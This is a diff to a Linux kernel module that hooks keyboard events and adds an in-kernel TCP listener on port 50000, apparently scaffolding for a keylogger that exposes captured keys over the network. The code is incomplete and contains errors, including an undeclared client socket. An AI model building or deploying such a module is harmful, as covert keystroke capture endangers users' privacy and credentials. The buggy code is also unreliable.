@@ -2,8 +2,9 @@
 #include <linux/init.h>
 #include <linux/keyboard.h>
 #include <linux/printk.h>
-#include <sys/socket.h>
-#include <sys/socketvar.h>
+#include <linux/net.h>
+
+#define PORT 50000
 
 static int keyboard_callback(struct notifier_block *nblock, unsigned long code, void *_param)
 {
@@ -30,13 +31,62 @@ static struct notifier_block keyboard_nb = {
     .notifier_call = keyboard_callback
 };
 
+// Creates socket
+static int create_socket(struct socket **sock) {
+    struct sockaddr_in server_addr;
+    int ret;
+
+    // Create TCP socket
+    ret = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, sock);
+    if (ret < 0) {
+        printk(KERN_ERR "failed to create socket\n");
+        return ret;
+    }
+
+    // Setup server address and bind it to the socket
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(PORT);
+    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+
+    // Bind socket to server address
+    // ret = kernel_bind(sock, (struct sockaddr*)&saddr, sizeof(saddr));
+    ret = (*sock)->ops->bind(*sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+    if (ret < 0) {
+        printk(KERN_ERR "failed to bind socket\n");
+        return ret;
+    }
+
+    // Listen for incoming connections
+    // ret = kernel_listen(sock, 1);
+    ret = (*sock)->ops->listen(*sock, 1);
+    if (ret < 0) {
+        printk(KERN_ERR "failed to listen on socket\n");
+        return ret;
+    }
+
+    // Accept incoming connections
+    // ret = kernel_accept(sock, &client_sock, 0);
+    ret = (*sock)->ops->accept(*sock, &client_sock, 0);
+    if (ret < 0) {
+        printk(KERN_ERR "failed to accept connection\n");
+        return ret;
+    }
+
+    return ret;
+
+}
+
 static int __init keyboard_module_init(void)
 {
+    struct socket *sock;
+    
+    // Create server
+    create_socket(&sock);
+
     // Register the keyboard notifier
     register_keyboard_notifier(&keyboard_nb);
-
-    // Attempt connection to server
-    
 
     return 0;
 }
@@ -51,5 +101,5 @@ module_init(keyboard_module_init);
 module_exit(keyboard_module_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Angelo");
+MODULE_AUTHOR("Matheus V. Bellini & Angelo B. Guido");
 MODULE_DESCRIPTION("Keyboard Module");
